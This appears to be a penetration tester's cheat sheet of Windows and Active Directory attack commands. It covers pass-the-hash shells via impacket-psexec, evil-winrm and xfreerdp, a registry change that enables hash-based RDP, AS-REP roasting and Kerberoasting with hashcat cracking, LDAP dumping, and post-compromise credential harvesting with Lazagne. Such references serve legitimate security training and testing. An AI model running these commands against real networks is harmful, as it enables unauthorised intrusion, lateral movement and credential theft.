# Most Used Commands

> [!tip] Usage
> `Ctrl + F` → search by **<Technology name>** (impacket, evil-winrm, smb, mssql, asrep…)

---
# Index

1. [Compromised User](#Compromised_User)
2. [Active Directory](#Active-Directory)
3. [Connecting to Windows-Shell](#Connecting-to-Windows-Shell)
4. [Connecting to Windows-RDP](Connecting-to-Windows-RDP)
5. [File Transfer SMB](#File-Transfer)
---

# Connecting-to-Windows-Shell

## From Linux

### `impacket-psexec` — SYSTEM shell over SMB

```bash
# with a password
impacket-psexec domain.local/User:'Password'@<IP>

# with a hash (pass-the-hash)
impacket-psexec ./administrator@192.168.183.121 -hashes :<Hash>
```

### `evil-winrm` — WinRM shell (password or hash)

```bash
# with a password
evil-winrm -i <IP> -u '' -p ''

# with a hash (pass-the-hash)
evil-winrm -i 10.10.174.59 -u administrator -H 6bc99ede9edcfecf9662fb0c0ddcfa7a
```

---

## From Windows

### PSRemoting

```powershell
# enable on the target first (if needed)
Enable-PSRemoting -Force
```

```powershell
# connect as current user
Enter-PSSession -ComputerName <Target Computer>

# connect with explicit creds
Enter-PSSession -ComputerName <Target Computer> -Credential Domain\User
```

### Winrs

```powershell
# run a single command as current user
winrs -r:<Target> cmd /c "net user"

# run with explicit creds
winrs -r:<Target> -u:<User> -p:<Passwd> cmd.exe
```

---

## SMB

```bash
# anonymous / null session — list shares
smbclient -N -L \\\\$IP\\

# authenticated — enumerate shares
netexec smb $IP -u '' -p '' --shares
```

---

# Connecting-to-Windows-RDP

### `xfreerdp` — password

```bash
xfreerdp /u:username /p:'password' /v:<IP> /workarea /smart-sizing /cert:ignore /tls-seclevel:0
```

### `xfreerdp` — pass-the-hash

```bash
xfreerdp /v:192.168.173.175 /u:"user" /d:. /pth:Hash
```

> [!note] If you get an error (no admin privileges needed)
> Run this on the **target** to allow Restricted Admin / PtH RDP:
> ```cmd
> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
> ```

---

# MSSQL

> [!note]
> Remove `-windows-auth` if **not** a local SQL account.

```bash
# windows auth
impacket-mssqlclient Administrator@$IP -p 1433 -windows-auth

# supply password in line
impacket-mssqlclient User:'Password'@$IP -p 1433 -windows-auth
```

---

# Active-Directory

**Index**

1. [AS-REP Roasting](#as-rep-roasting)
2. [Kerberoasting](#kerberoasting)
3. [User Enumeration](#user-enumeration)
4. [LDAP Domain Dump](#ldap-domain-dump)

---

## AS-REP Roasting

> [!note]
> This is not an exhaustive list — check your OneNote.

```bash
# find roastable accounts
impacket-GetNPUsers -dc-ip <IP> -request 'domain.local/'

# using a valid users list
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip $IP | grep -v 'KDC_ERR_C_PRINCIPAL_UNKNOWN'
```

```bash
# crack AS-REP hashes (try applying rules)
hashcat -m 18200 hash.txt rockyou.txt
```

## Kerberoasting

```bash
# list kerberoastable users
netexec ldap $IP -u $user -p $pass --kerberoasting output.txt 
```

```bash
# crack the hashes
hashcat -m 13100 hash.txt rockyou.txt
```

## User Enumeration

```bash
netexec smb <> -u mscott -p Windows1 --users 2>/dev/null | awk {'print $5'} | grep -v '-Username-' > valid_users.txt
```

## LDAP Domain Dump

```bash
ldapdomaindump ldaps://<DC-IP> -u 'Domain\User' -p Password1
```

---

# Compromised_User

**Index**

1. [Checks](#User_Hunting)

## User_Hunting

```bash
1. Use netexec to test on all IPs each protocol (SMB, Winrm, RDP, MSSQL, --Shares) with new compromised user.
https://github.com/Boon-Rekcah/Cheatsheet/blob/main/userhunt.sh
```
```bash
2. Run NetExec Spider from a compromised host under new user's context
```
```
3. Run Lazagne.exe from a compromised host under new user's context
```
---

# File-Transfer

```bash
mkdir -p /tmp/smbshare
cd /tmp/smbshare
impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```
